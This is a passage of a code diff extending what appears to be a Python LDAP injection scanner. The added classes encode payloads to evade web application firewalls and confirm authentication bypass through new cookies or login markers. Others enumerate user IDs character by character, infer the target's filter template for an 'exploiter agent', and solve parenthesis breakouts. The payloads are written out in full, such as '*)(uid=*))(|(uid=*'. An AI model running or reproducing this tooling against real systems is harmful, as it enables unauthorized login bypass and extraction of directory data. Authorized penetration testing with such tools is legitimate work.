+        self._lock          = threading.Lock()
+        self._throttled     = False
+        self.adjustments    = 0
+
+    def record(self, ok: bool) -> None:
+        with self._lock:
+            self._window.append(0 if ok else 1)
+            if len(self._window) == self._WINDOW:
+                self._evaluate()
+
+    def _evaluate(self) -> None:
+        rate = sum(self._window) / len(self._window)
+        if rate > self._THROTTLE_AT and not self._throttled:
+            self._current_delay = max(self._current_delay * 2, 0.5)
+            self._current_delay += random.uniform(0, self._current_delay * 0.3)
+            self._throttled     = True
+            self.adjustments   += 1
+            warn(f"  [Throttler] Rate-limit detected (err={rate:.0%}) "
+                 f"→ delay={self._current_delay:.2f}s")
+        elif rate < self._HEAL_AT and self._throttled:
+            self._current_delay = self._base_delay
+            self._throttled     = False
+            info(f"  [Throttler] Error rate healed → delay restored")
+
+    def sleep(self) -> None:
+        d = self._current_delay
+        if d > 0:
+            time.sleep(d + random.uniform(0, d * 0.1))
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# §V13-FE   FILTER EVASION ENCODER — Encoded LDAP payload variants
+# ═══════════════════════════════════════════════════════════════════════════════
+
+class FilterEvasionEncoder:
+    """V13 — \2A hex, URL, double-URL, mixed-case variants to bypass WAF rules."""
+    _LDAP_HEX = {
+        "*":"\\2a","(":"\\28",")":"\\29","\\":"\\5c",
+        "\0":"\\00","&":"\\26","|":"\\7c","!":"\\21",
+    }
+
+    @staticmethod
+    def ldap_hex(payload: str, full: bool = False) -> str:
+        if not full:
+            return payload.replace("*", "\\2a")
+        return "".join(FilterEvasionEncoder._LDAP_HEX.get(c, c) for c in payload)
+
+    @staticmethod
+    def url_enc(payload: str) -> str:
+        return quote(payload, safe="")
+
+    @staticmethod
+    def double_url(payload: str) -> str:
+        return quote(quote(payload, safe=""), safe="")
+
+    @classmethod
+    def all_variants(cls, payload: str) -> List[Tuple[str, str]]:
+        return [
+            ("raw",          payload),
+            ("ldap_hex",     cls.ldap_hex(payload, full=False)),
+            ("ldap_hex_full",cls.ldap_hex(payload, full=True)),
+            ("url_enc",      cls.url_enc(payload)),
+            ("double_url",   cls.double_url(payload)),
+        ]
+
+    @classmethod
+    def evasion_payload_objects(cls, base_list: List[str]) -> List["Payload"]:
+        out: List[Payload] = []
+        for raw in base_list:
+            for enc, variant in cls.all_variants(raw):
+                if enc == "raw":
+                    continue
+                out.append(Payload(raw=variant, desc=f"evasion_{enc}", technique=f"filter_evasion_{enc}", tier=PayloadTier.TIER3_WAF, priority=5))
+        return out
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# §V13-BF   BEHAVIORAL FINGERPRINTER — Phase 1 timing baseline with benign filters
+# ═══════════════════════════════════════════════════════════════════════════════
+
+class BehavioralFingerprinter:
+    """V13 — Benign LDAP-style filter probes to build timing baseline per endpoint."""
+    _PROBES = [
+        ("valid_nonexist",  "(uid=nonexistentuser_ldapi_probe)"),
+        ("empty",           ""),
+        ("wildcard_uid",    "(uid=*)"),
+        ("objectclass_any", "(objectClass=*)"),
+    ]
+
+    def __init__(self, client: "HTTPClient", cfg: "ScanConfig",
+                 throttler: "AdaptiveScanThrottler"):
+        self._client    = client
+        self._cfg       = cfg
+        self._throttler = throttler
+        self._baselines: Dict[str, float] = {}
+
+    def fingerprint(self, ep: "Endpoint", param: str) -> Dict[str, float]:
+        timings: Dict[str, float] = {}
+        for label, filt in self._PROBES:
+            data = build_injection_data(ep, param, filt,
+                                        self._cfg.deterministic_suffix)
+            t0   = time.monotonic()
+            resp = self._client.send_endpoint(ep, data, phase="tier0")
+            el   = time.monotonic() - t0
+            ok   = resp is not None and resp.status_code < 500
+            self._throttler.record(ok)
+            timings[label] = round(el, 4)
+            self._throttler.sleep()
+
+        vals = sorted(timings.values())
+        med  = vals[len(vals) // 2]
+        timings["median"] = med
+        self._baselines[ep.key] = med
+        vprint(f"  [BehavFP] {ep.url}:{param} median={med:.3f}s")
+        return timings
+
+    def get_baseline(self, ep_key: str) -> float:
+        return self._baselines.get(ep_key, 0.5)
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# §V13-BDE  BASELINE DEVIATION ENGINE — Phase 3 per-param deviation scoring
+# ═══════════════════════════════════════════════════════════════════════════════
+
+class BaselineDeviationEngine:
+    """V13 — Compare injection response vs safe-input baseline per parameter."""
+
+    @dataclass
+    class DeviationScore:
+        param:          str
+        ep_key:         str
+        length_delta:   int   = 0
+        status_changed: bool  = False
+        ldap_error:     bool  = False
+        timing_spike:   bool  = False
+        struct_change:  bool  = False
+        score:          float = 0.0
+        evidence:       str   = ""
+
+    def __init__(self, client: "HTTPClient", cfg: "ScanConfig",
+                 behav_fp: "BehavioralFingerprinter"):
+        self._client   = client
+        self._cfg      = cfg
+        self._behav_fp = behav_fp
+        self._scores:  Dict[str, "BaselineDeviationEngine.DeviationScore"] = {}
+        self._history: Dict[str, List[float]] = defaultdict(list)  # V14: mean reversion
+
+    def measure(self, ep: "Endpoint", param: str,
+                baseline: "Baseline"
+                ) -> "BaselineDeviationEngine.DeviationScore":
+        key = f"{ep.key}:{param}"
+        if key in self._scores:
+            return self._scores[key]
+
+        ds = self.DeviationScore(param=param, ep_key=ep.key)
+
+        safe_resp = self._client.send_endpoint(
+            ep,
+            build_injection_data(ep, param, safe_val(param),
+                                 self._cfg.deterministic_suffix),
+            phase="tier0")
+        if safe_resp is None:
+            self._scores[key] = ds
+            return ds
+
+        t0 = time.monotonic()
+        inj_resp = self._client.send_endpoint(
+            ep,
+            build_injection_data(ep, param, "*", self._cfg.deterministic_suffix),
+            phase="tier0")
+        inj_time = time.monotonic() - t0
+        if inj_resp is None:
+            self._scores[key] = ds
+            return ds
+
+        safe_len = len(safe_resp.text or "")
+        inj_len  = len(inj_resp.text  or "")
+        ds.length_delta = abs(inj_len - safe_len)
+        score = 0.0
+
+        if ds.length_delta > 50:
+            score += min(ds.length_delta / 100, 20)
+            ds.evidence += f"len_delta={ds.length_delta} "
+        if inj_resp.status_code != safe_resp.status_code:
+            ds.status_changed = True
+            score += 15
+            ds.evidence += f"status:{safe_resp.status_code}→{inj_resp.status_code} "
+        if LDAP_ERRORS_RE.search(inj_resp.text or ""):
+            ds.ldap_error = True
+            score += 30
+            ds.evidence += "ldap_error "
+        bline = self._behav_fp.get_baseline(ep.key)
+        if bline > 0 and inj_time > bline * 2.5:
+            ds.timing_spike = True
+            score += 20
+            ds.evidence += f"timing_spike={inj_time:.3f}s "
+        if classify_baseline_response(safe_resp) != classify_baseline_response(inj_resp):
+            ds.struct_change = True
+            score += 10
+            ds.evidence += "struct_change "
+
+        # V14: mean reversion — report P75 of rolling window, not raw max
+        self._history[key].append(min(score, 100.0))
+        window = self._history[key][-5:]
+        p75_idx = max(0, int(len(window) * 0.75) - 1)
+        ds.score = sorted(window)[p75_idx]
+        self._scores[key] = ds
+        if ds.score > 15:
+            vprint(f"  [BDE] {ep.url}:{param} dev={ds.score:.1f} {ds.evidence}")
+        return ds
+
+    def get(self, ep_key: str, param: str
+            ) -> Optional["BaselineDeviationEngine.DeviationScore"]:
+        return self._scores.get(f"{ep_key}:{param}")
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# §V13-WRM  WEIGHTED RISK MODEL — Phase 3 multi-factor composite scoring
+# ═══════════════════════════════════════════════════════════════════════════════
+
+class WeightedRiskModel:
+    """V13 — BDE(0.40) + ATM(0.25) + FDD(0.20) + history(0.15) + ep_type_boost."""
+    _EP_BOOST = {
+        "auth":20,"login":20,"signin":20,"search":15,"query":15,
+        "lookup":15,"admin":18,"manage":15,"user":12,"account":12,
+        "ldap":22,"directory":22,"profile":10,"config":12,
+    }
+
+    def __init__(self, bde: "BaselineDeviationEngine",
+                 atm: "AdaptiveTargetModel",
+                 fdd: Optional["FeedbackDrivenDiscovery"]):
+        self._bde  = bde
+        self._atm  = atm
+        self._fdd  = fdd
+        self._hist: Dict[str, float] = defaultdict(float)
+
+    def score(self, ep: "Endpoint", param: str) -> float:
+        bde_r = self._bde.get(ep.key, param)
+        bde_s = bde_r.score if bde_r else 0.0
+        atm_s = self._atm.get_ep_score(ep.key)
+        fdd_s = 0.0
+        if self._fdd and hasattr(self._fdd, "_scores"):
+            fb    = self._fdd._scores.get(ep.key)
+            fdd_s = fb.total if fb else 0.0
+        # V14: path-segment matching prevents compound-path false boosts
+        from urllib.parse import urlparse as _up
+        _segs = set(_up(ep.url).path.lower().strip("/").split("/"))
+        ep_boost = max(
+            (v for k, v in self._EP_BOOST.items() if k in _segs),
+            default=0)
+        param_boost  = self._atm.score_param_name(param) * 3
+        hist_s       = self._hist.get(f"{ep.key}:{param}", 0.0)
+        return min(bde_s*0.40 + atm_s*0.25 + fdd_s*0.20 +
+                   hist_s*0.15 + ep_boost + param_boost, 100.0)
+
+    def record_anomaly(self, ep_key: str, param: str, delta: float) -> None:
+        self._hist[f"{ep_key}:{param}"] = min(
+            self._hist[f"{ep_key}:{param}"] + delta, 100.0)
+
+    def top_params(self, ep: "Endpoint",
+                   params: List[str]) -> List[Tuple[str, float]]:
+        return sorted([(p, self.score(ep, p)) for p in params],
+                      key=lambda x: x[1], reverse=True)
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# §V13-AC   ANOMALY CORRELATOR — Cross-param exponential risk amplification
+# ═══════════════════════════════════════════════════════════════════════════════
+
+class AnomalyCorrelator:
+    """V13 — Multiple anomalous params on same endpoint → exponential risk boost."""
+
+    def __init__(self):
+        self._ep_params: Dict[str, List[str]] = defaultdict(list)
+        self._ep_risk:   Dict[str, float]     = defaultdict(float)
+
+    def record(self, ep_key: str, param: str, score: float) -> None:
+        if score > 15:
+            self._ep_params[ep_key].append(param)
+            n = len(self._ep_params[ep_key])
+            # V14: Cap multiplier at 1.8× to prevent single noisy endpoint dominating
+            multiplier = min(1.0 + (n - 1) * 0.4, 1.8)
+            self._ep_risk[ep_key] = min(score * multiplier, 100.0)
+
+    def get_multiplier(self, ep_key: str) -> float:
+        n = len(self._ep_params.get(ep_key, []))
+        return 1.0 + (n - 1) * 0.5 if n > 1 else 1.0
+
+    def high_risk_endpoints(self) -> List[Tuple[str, float]]:
+        return sorted(self._ep_risk.items(), key=lambda x: x[1], reverse=True)
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# §V13-SV   STATE VALIDATOR — Phase 4 post-injection session/auth state check
+# ═══════════════════════════════════════════════════════════════════════════════
+
+class StateValidator:
+    """V13 — After suspected auth bypass, confirm session state changed."""
+    _AUTH_RE = re.compile(
+        r"logged.in|welcome|dashboard|admin.panel|authenticated|"
+        r"sign.out|logout|my.account|hello,?\s+\w+", re.I)
+    _ID_RE   = re.compile(
+        r"user(?:name)?[\"'\s:=]+([a-zA-Z0-9_@.-]{2,40})", re.I)
+
+    @dataclass
+    class Result:
+        confirmed_bypass: bool      = False
+        new_cookies:      List[str] = field(default_factory=list)
+        auth_marker:      bool      = False
+        identity:         str       = ""
+        narrative:        str       = ""
+
+    def __init__(self, client: "HTTPClient"):
+        self._client = client
+
+    def validate(self, ep: "Endpoint", param: str,
+                 payload: str, baseline_body: str,
+                 cfg: "ScanConfig") -> "StateValidator.Result":
+        res = self.Result()
+        before = set(self._client._get_session(AuthState.UNAUTH).cookies.keys())
+        resp   = self._client.send_endpoint(
+            ep,
+            build_injection_data(ep, param, payload,
+                                 cfg.deterministic_suffix),
+            phase="verification")
+        if resp is None:
+            res.narrative = "no_response"
+            return res
+
+        after      = set(resp.cookies.keys()) | set(self._client._get_session(AuthState.UNAUTH).cookies.keys())
+        new_c      = list(after - before)
+        body       = resp.text or ""
+        res.new_cookies = new_c
+
+        if self._AUTH_RE.search(body) and not self._AUTH_RE.search(baseline_body):
+            res.auth_marker = True
+            res.narrative  += "auth_marker_appeared "
+        m = self._ID_RE.search(body)
+        if m:
+            res.identity    = m.group(1).strip()
+            res.narrative  += f"identity={res.identity} "
+
+        res.confirmed_bypass = bool(new_c) or res.auth_marker
+        if res.confirmed_bypass:
+            res.narrative += "AUTH_BYPASS_STATE_CONFIRMED"
+        return res
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# §V13-DEP  DATA EXTRACTION PROBE — Phase 4 benign attribute retrieval
+# ═══════════════════════════════════════════════════════════════════════════════
+
+class DataExtractionProbe:
+    """V13 — Safe read-only attribute probes to validate injection depth."""
+    _ATTR_FILTERS = [
+        ("cn_wildcard", "*(cn=*)"),
+        ("uid_admin",   "*(uid=admin*)"),
+        ("mail_any",    "*(mail=*)"),
+        ("objectclass", "*(objectClass=person)"),
+        ("all_objects", "*(objectClass=*)"),
+    ]
+    _ENUM_CHARS = list("abcdefghijklmnopqrstuvwxyz0123456789")
+
+    def __init__(self, client: "HTTPClient", cfg: "ScanConfig",
+                 budget: "AdaptiveBudgetManager"):
+        self._client = client
+        self._cfg    = cfg
+        self._budget = budget
+
+    def probe(self, ep: "Endpoint", param: str,
+              baseline: "Baseline") -> Dict[str, Any]:
+        result: Dict[str, Any] = {
+            "attr_triggered": [], "enum_chars": [],
+            "extraction_confidence": 0, "response_variations": {},
+        }
+        blen = len(baseline.body or "")
+
+        for label, filt in self._ATTR_FILTERS:
+            if not self._budget.acquire_for_phase("verification"):
+                break
+            resp = self._client.send_endpoint(
+                ep,
+                build_injection_data(ep, param, filt, self._cfg.deterministic_suffix),
+                phase="verification")
+            if resp is None:
+                continue
+            delta = abs(len(resp.text or "") - blen)
+            if delta > 30:
+                result["attr_triggered"].append(
+                    {"filter": label, "body_delta": delta})
+                result["extraction_confidence"] = min(
+                    result["extraction_confidence"] + 15, 100)
+
+        for ch in self._ENUM_CHARS[:8]:
+            if not self._budget.acquire_for_phase("verification"):
+                break
+            resp = self._client.send_endpoint(
+                ep,
+                build_injection_data(ep, param, f"*(uid={ch}*)",
+                                     self._cfg.deterministic_suffix),
+                phase="verification")
+            if resp is None:
+                continue
+            body_len = len(resp.text or "")
+            result["response_variations"][ch] = body_len
+            if abs(body_len - blen) > 40:
+                result["enum_chars"].append(ch)
+                result["extraction_confidence"] = min(
+                    result["extraction_confidence"] + 5, 100)
+
+        return result
+
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# §V14-LFR  LDAP FILTER RECONSTRUCTOR — Infer original filter template
+# ═══════════════════════════════════════════════════════════════════════════════
+
+class LDAPFilterReconstructor:
+    """
+    V14 — Idea #2 from enterprise tool analysis.
+    When TRUE probe fires (*(cn=*)) and FALSE probe doesn't (*(cn=\x00NOMATCH)):
+    infer the original LDAP filter structure from behavioral oracle responses.
+    Tells the exploiter agent EXACTLY what filter to break.
+    """
+    _TRUE_MARKERS  = ["*(cn=*)", "*(uid=*)", "*(objectClass=*)"]
+    _FALSE_MARKERS = ["*(cn=\x00NOMATCH__ldapi)", "*(uid=\x00NOMATCH__ldapi)"]
+    _ATTR_PROBES   = ["uid", "cn", "mail", "sAMAccountName", "userPrincipalName",
+                      "memberOf", "objectClass", "employeeID", "department"]
+
+    def __init__(self, client: "HTTPClient", cfg: "ScanConfig",
+                 budget: "AdaptiveBudgetManager"):
+        self._client = client
+        self._cfg    = cfg
+        self._budget = budget
+
+    def reconstruct(self, ep: "Endpoint", param: str,
+                    baseline: "Baseline") -> Dict[str, Any]:
+        """
+        Probe with TRUE/FALSE pairs per attribute to infer filter template.
+        Returns dict: { inferred_filter, injectable_attrs, confidence }
+        """
+        result = {"inferred_filter": "", "injectable_attrs": [], "confidence": 0}
+        blen   = len(baseline.body or "")
+        confirmed_attrs: List[str] = []
+
+        for attr in self._ATTR_PROBES:
+            if not self._budget.acquire_for_phase("verification"):
+                break
+
+            # TRUE probe for this attr
+            true_pl = f"*({attr}=*)"
+            data_t  = build_injection_data(ep, param, true_pl,
+                                            self._cfg.deterministic_suffix)
+            resp_t  = self._client.send_endpoint(ep, data_t, phase="verification")
+
+            # FALSE probe for this attr
+            false_pl = f"*({attr}=\x00NOMATCH__ldapi__x00)"
+            data_f   = build_injection_data(ep, param, false_pl,
+                                             self._cfg.deterministic_suffix)
+            resp_f   = self._client.send_endpoint(ep, data_f, phase="verification")
+
+            if resp_t is None or resp_f is None:
+                continue
+
+            len_t = len(resp_t.text or "")
+            len_f = len(resp_f.text or "")
+
+            # TRUE fires if len_t > baseline AND len_f ≈ baseline
+            if abs(len_t - blen) > 40 and abs(len_f - blen) < 30:
+                confirmed_attrs.append(attr)
+                result["confidence"] = min(result["confidence"] + 20, 100)
+
+        if confirmed_attrs:
+            # Infer most likely filter template
+            if "uid" in confirmed_attrs and "userPrincipalName" not in confirmed_attrs:
+                result["inferred_filter"] = f"(&(uid=INPUT)(objectClass=person))"
+            elif "sAMAccountName" in confirmed_attrs:
+                result["inferred_filter"] = f"(&(sAMAccountName=INPUT)(objectClass=user))"
+            elif "mail" in confirmed_attrs:
+                result["inferred_filter"] = f"(&(mail=INPUT)(objectClass=inetOrgPerson))"
+            else:
+                attrs_str = ")(|".join(f"({a}=INPUT)" for a in confirmed_attrs[:3])
+                result["inferred_filter"] = f"(&({attrs_str}))"
+            result["injectable_attrs"] = confirmed_attrs
+
+        return result
+
+
+class ParenthesisBoundarySolver:
+    """
+    Dynamically maps the parenthesis structure and escaping boundary of target query.
+    Probes parameters with increasing levels of closing parentheses to find where
+    the query remains syntactically valid and stable.
+    """
+    def __init__(self, client: "HTTPClient", cfg: "ScanConfig", budget: "AdaptiveBudgetManager"):
+        self._client = client
+        self._cfg = cfg
+        self._budget = budget
+
+    def solve(self, ep: Endpoint, param: str, baseline: Baseline) -> Dict[str, Any]:
+        """
+        Drives boundary breakout detection.
+        Returns dict: { 'prefix': str, 'suffix': str, 'depth': int, 'solved': bool }
+        """
+        result = {'prefix': '', 'suffix': '', 'depth': 0, 'solved': False}
+        if not self._budget.acquire_for_phase("verification"):
+            return result
+
+        # Test templates for matching structural balanced queries
+        # Each candidate is: (prefix, suffix, depth)
+        candidates = [
+            ("*", "", 0),
+            ("*(objectClass=*", ")", 1),
+            ("*)(objectClass=*", "))", 2),
+            ("*))(|(objectClass=*", ")))", 3),
+            ("*)))(|(objectClass=*", "))))", 4),
+        ]
+
+        blen = len(baseline.body or "")
+        best_depth = -1
+        min_diff = 1.0
+        
+        for prefix, suffix, depth in candidates:
+            if not self._budget.acquire_for_phase("verification"):
+                break
+                
+            test_val = prefix + suffix
+            data = build_injection_data(ep, param, test_val, self._cfg.deterministic_suffix)
+            resp = self._client.send_endpoint(ep, data, phase="verification")
+            if resp is None:
+                continue
+                
+            body = resp.text or ""
+            diff = sim_delta(baseline.body, body)
+            
+            # Check for error indicators (avoid queries that break syntax)
+            has_error = (resp.status_code >= 500 or 
+                         LDAP_ERRORS_RE.search(body) or 
+                         LDAP_ERRORS_LOW_RE.search(body))
+            
+            # If query is stable and syntax matches backend structure
+            if not has_error and diff < min_diff:
+                min_diff = diff
+                best_depth = depth
+                result['prefix'] = prefix
+                result['suffix'] = suffix
+                result['depth'] = depth
+                result['solved'] = True
+
+        if result['solved']:
+            verbose(f"  [ParenthesisBoundarySolver] Solved {ep.url}:{param} depth={best_depth} prefix={result['prefix']!r} suffix={result['suffix']!r}")
+        return result
+
+
+def adapt_payload_to_boundary(payload_raw: str, boundary: Dict[str, Any]) -> str:
+    """
+    Dynamically reformats structural parts of an LDAP payload to match
+    the query boundary depth.
+    """
+    if not boundary or not boundary.get('solved'):
+        return payload_raw
+    depth = boundary.get('depth', 0)
+    if depth == 0:
+        return payload_raw
+    
+    # Check for common structural signatures and balance them to depth D
+    if "uid=*" in payload_raw:
+        return "*" + ")" * depth + "(|(uid=*))"
+    if "objectClass=*" in payload_raw:
+        return "*" + ")" * depth + "(|(objectClass=*))"
+    if "admin" in payload_raw:
+        return "admin" + ")" * depth + "(|(objectClass=*))"
+        
+    # Fallback wrapping using solved prefix and suffix
+    clean_val = payload_raw.replace("*", "").replace("(", "").replace(")", "").replace("|", "").replace("&", "")
+    return boundary['prefix'] + clean_val + boundary['suffix']
+
+
+class CredentialStuffingOracle:
+    """
+    V14 — Idea #4: Maintain 5 known-invalid credentials + 1 LDAP injection credential.
+    If injection credential returns different response class → LDAP backend confirmed.
+    Works without any error disclosure.
+    """
+    _KNOWN_INVALID = [
+        ("invalid_user_ldapi_1", "wrong_pass_ldapi_1"),
+        ("invalid_user_ldapi_2", "wrong_pass_ldapi_2"),
+        ("invalid_user_ldapi_3", "wrong_pass_ldapi_3"),
+        ("__nobody__",           "nopassword1234"),
+        ("zzz_no_such_user",     "zzz_no_such_pass"),
+    ]
+    _INJECTION_CRED = ("*)(uid=*))(|(uid=*", "any_password")
+
+    def __init__(self, client: "HTTPClient", cfg: "ScanConfig"):
+        self._client = client
+        self._cfg    = cfg
+
+    def probe(self, ep: "Endpoint",
+              user_param: str, pass_param: str) -> Dict[str, Any]:
+        """
+        Returns dict: { ldap_backend_confirmed, response_classes, injection_class }
+        """
+        result = {"ldap_backend_confirmed": False,
+                  "response_classes": [], "injection_class": ""}
+
+        # Record response classes for known-invalid credentials
+        invalid_classes: List[str] = []
+        for u, p in self._KNOWN_INVALID[:3]:
+            data = {user_param: u, pass_param: p}
+            for param in ep.params:
+                if param not in (user_param, pass_param):
+                    data[param] = safe_val(param)
+            resp = self._client.send_endpoint(ep, data, phase="tier0")
+            if resp:
+                invalid_classes.append(classify_baseline_response(resp))
+
+        # Send injection credential
+        inj_u, inj_p = self._INJECTION_CRED
+        inj_data = {user_param: inj_u, pass_param: inj_p}
+        for param in ep.params:
+            if param not in (user_param, pass_param):
+                inj_data[param] = safe_val(param)
+        inj_resp = self._client.send_endpoint(ep, inj_data, phase="tier0")
+
+        if inj_resp:
+            inj_class = classify_baseline_response(inj_resp)
+            result["injection_class"] = inj_class
+            result["response_classes"] = invalid_classes
+            # If injection credential produced a DIFFERENT class → LDAP backend
+            if invalid_classes and inj_class not in invalid_classes:
+                result["ldap_backend_confirmed"] = True
+                info(f"  [CredStuffingOracle] LDAP backend confirmed: "
+                     f"injection class={inj_class} vs invalid={set(invalid_classes)}")
+
+        return result
 
 
 class ExternalEndpointLoader:
@@ -11853,10 +13301,22 @@ class ScanOrchestrator:
 
         # V12 — Adaptive intelligence engines
         self._target_model  = AdaptiveTargetModel()
-        self._fdd           = None   # set after client ready (needs budget ref)
-        self._dpr           = None   # set in injection phase
-        self._tpe           = None   # set in injection phase
-        self._ev            = None   # set in finalize
+        self._fdd           = None
+        self._dpr           = None
+        self._tpe           = None
+        self._ev            = None
+
+        # V13 — New engines
+        self._asset_registry = EndpointDeduplicationRegistry()
+        self._throttler      = AdaptiveScanThrottler(
+            base_delay=cfg.delay if hasattr(cfg, "delay") else 0.0)
+        self._filter_evasion = FilterEvasionEncoder()
+        self._behav_fp       = None   # instantiated after client ready
+        self._bde            = None
+        self._wrm            = None
+        self._anomaly_corr   = AnomalyCorrelator()
+        self._state_validator= None
+        self._dep            = None
 
         # Will be set after Phase 0
         self._server_type = LDAPServerType.GENERIC.value
@@ -11873,7 +13333,10 @@ class ScanOrchestrator:
         """
         V8 — Execute full scan pipeline with ControlPlane governing each phase.
         """
-        self._status.start()
+        if self._cfg.no_status:
+            self._status._running = True   # mark running but never render
+        else:
+            self._status.start()
         try:
             # ── Phase 0: Target Liveness Pre-flight (V11) ─────────────────────
             self._tracer.log("phase0", "liveness_check", self._cfg.target)
@@ -11966,6 +13429,38 @@ class ScanOrchestrator:
             self._status.phase = "BehavioralRisk"
             behavioral_scores = self._phase3_behavioral_risk(all_eps)
 
+            # V13 — Instantiate BDE, WRM, DEP now that client/budget ready
+            self._bde = BaselineDeviationEngine(
+                self._client, self._cfg, self._behav_fp)
+            self._wrm = WeightedRiskModel(
+                self._bde, self._target_model, self._fdd)
+            self._dep = DataExtractionProbe(
+                self._client, self._cfg, self._budget)
+
+            # V13 — Run BDE + AnomalyCorrelator on behavioral phase results
+            info("  [V13] Running BaselineDeviation + AnomalyCorrelator...")
+            for ep in all_eps[:20]:   # top 20 by ldap_prob
+                for param in ep.params[:4]:
+                    bde_r = self._bde.measure(ep, param,
+                                              Baseline(status=200, body="", body_len=0, body_hash="", norm_body_hash="", has_form=False, final_url=ep.url, cookies=set(), response_class="STATIC"))
+                    wrm_s = self._wrm.score(ep, param)
+                    self._anomaly_corr.record(ep.key, param, bde_r.score)
+                    if bde_r.score > 20:
+                        # Boost ldap_prob of high-deviation endpoints
+                        ep.ldap_prob = min(ep.ldap_prob + int(bde_r.score * 0.3), 95)
+                    if wrm_s > 50:
+                        self._tracer.log("phase3", "high_risk_param",
+                                         f"{ep.url}:{param} wrm={wrm_s:.1f}",
+                                         outcome="high")
+                    self._logger.log_phase_adjustment(
+                        f"BDE:{ep.url}:{param}=dev{bde_r.score:.0f}|wrm{wrm_s:.0f}")
+
+            # V13 — Log cross-endpoint anomaly correlation results
+            high_risk_eps = self._anomaly_corr.high_risk_endpoints()
+            if high_risk_eps:
+                info(f"  [AnomalyCorrelator] Top correlated: "
+                     f"{high_risk_eps[0][0][:50]} score={high_risk_eps[0][1]:.1f}")
+
             # Feed Phase 3 results into control plane
             high_risk_params = [
                 f"{ep.url}:{param}"
@@ -11975,8 +13470,14 @@ class ScanOrchestrator:
             ]
             self._cp.phase_feedback("phase3", {"high_risk_params": high_risk_params})
 
-            # Re-rank endpoints using behavioral scores
+            # Re-rank endpoints using behavioral scores + anomaly correlator
             all_eps = self._apply_behavioral_ranking(all_eps, behavioral_scores)
+            # Extra boost from AnomalyCorrelator
+            ep_map = {ep.key: ep for ep in all_eps}
+            for ep_key, corr_score in high_risk_eps[:10]:
+                if ep_key in ep_map:
+                    ep_map[ep_key].ldap_prob = min(
+                        ep_map[ep_key].ldap_prob + int(corr_score * 0.2), 95)
 
             # ── Phase 4: Vulnerability Audit ──────────────────────────────────
             self._logger.log_phase("baseline")
@@ -12008,6 +13509,8 @@ class ScanOrchestrator:
                 all_eps = [e for e in all_eps if e.key not in scanned_keys]
 
             web_findings = self._phase456_injection(all_eps, baselines, scanned_keys)
+            # V13 — Wire DEP engine into injection engine instances
+            # (done via _phase456_injection factory — see below)
 
             # V8: Enrich findings with confidence + impact
             web_findings = self._enrich_findings_v8(web_findings)
@@ -12122,10 +13625,94 @@ class ScanOrchestrator:
 
         return findings
 
+
+    def _verify_waf_vs_acl(self) -> bool:
+        """V14: Distinguish WAF 403 from access-control 403.
+        Sends benign probe to a known-404 path and oversized header.
+        WAF: blocks metachar (403) but allows benign 404 path (200/404).
+        ACL: blocks BOTH → it's an access-control rule, not WAF.
+        """
+        try:
+            benign_url = self._cfg.target.rstrip("/") + "/nonexistent_ldapi_check_v14"
+            sess = self._client._get_session(AuthState.UNAUTH)
+            r1 = sess.get(benign_url, timeout=self._cfg.timeout,
+                          verify=self._cfg.verify_ssl, allow_redirects=False)
+            if r1.status_code in (200, 301, 302, 404, 405):
+                return True   # benign path returned non-403 → WAF is real
+            if r1.status_code == 403:
+                return False  # benign path ALSO 403 → ACL not WAF
+        except Exception:
+            pass
+        return True   # default: assume WAF
+
+    def _detect_ntlm_kerberos(self, resp: Optional[requests.Response]) -> None:
+        """V14: Detect NTLM/Kerberos from WWW-Authenticate header → AD confirmed."""
+        if resp is None:
+            return
+        auth_hdr = resp.headers.get("WWW-Authenticate", "") or resp.headers.get("www-authenticate", "")
+        if not auth_hdr:
+            return
+        if "ntlm" in auth_hdr.lower():
+            self._server_profile.add("ad", 40)
+            self._handoff.ntlm_kerberos_detected = True
+            info(f"  [V14] NTLM auth header detected → AD backend confirmed (+40)")
+        elif "negotiate" in auth_hdr.lower() or "kerberos" in auth_hdr.lower():
+            self._server_profile.add("ad", 35)
+            self._handoff.ntlm_kerberos_detected = True
+            info(f"  [V14] Kerberos/Negotiate header → AD backend confirmed (+35)")
+
+    def _detect_cdn(self) -> None:
+        """V14: Detect CDN presence and set cdn_mode if needed."""
+        _CDN_HEADERS = {
+            "cf-ray": "Cloudflare", "x-amz-cf-id": "CloudFront",
+            "x-cache": "Generic_CDN", "via": "Varnish/Squid",
+            "x-cdn": "Generic_CDN", "x-served-by": "Fastly",
+        }
+        try:
+            sess = self._client._get_session(AuthState.UNAUTH)
+            r = sess.get(self._cfg.target, timeout=self._cfg.timeout,
+                         verify=self._cfg.verify_ssl, allow_redirects=True)
+            for hdr, provider in _CDN_HEADERS.items():
+                if r.headers.get(hdr):
+                    self._handoff.cdn_detected  = True
+                    self._handoff.cdn_provider  = provider
+                    if not self._cfg.cdn_mode:
+                        self._cfg.cdn_mode = True
+                        warn(f"  [V14] CDN detected ({provider}) — timing thresholds +30%")
+                    break
+        except Exception:
+            pass
+
     def _phase0_intelligence(self) -> None:
         """Wave 3: Multi-vector target fingerprinting (§3.1-3.6)."""
         phase_header(1, "Target Intelligence")
-        
+
+        # V14: CDN detection early in phase 0
+        self._detect_cdn()
+
+        # V13 — Passive DNS enumeration (silent, before any active probe)
+        parsed_host = urlparse(self._cfg.target).hostname or self._cfg.target
+        self._tracer.log("phase1", "passive_dns", parsed_host)
+        dns_enum = PassiveDNSEnumerator(parsed_host, self._asset_registry)
+        dns_results = dns_enum.enumerate()
+
+        # V13 — Certificate transparency lookup
+        cert_fetch = CertTransparencyFetcher(
+            parsed_host, self._asset_registry, self._client._get_session(AuthState.UNAUTH))
+        cert_hosts = cert_fetch.fetch()
+
+        # V13 — Instantiate remaining engines now that client is ready
+        self._behav_fp = BehavioralFingerprinter(
+            self._client, self._cfg, self._throttler)
+        self._state_validator = StateValidator(self._client)
+
+        reg_summary = self._asset_registry.summary()
+        info(f"  [AssetRegistry] {reg_summary['total']} assets"
+             f" ({reg_summary['high_conf']} high-conf,"
+             f" {reg_summary['ldap_entries']} LDAP)")
+        self._handoff.passive_dns_records = len(dns_results)
+        self._handoff.cert_transparency_hosts = len(cert_hosts)
+
         # Wave 3: Deferred WAF fingerprinting (§3.1)
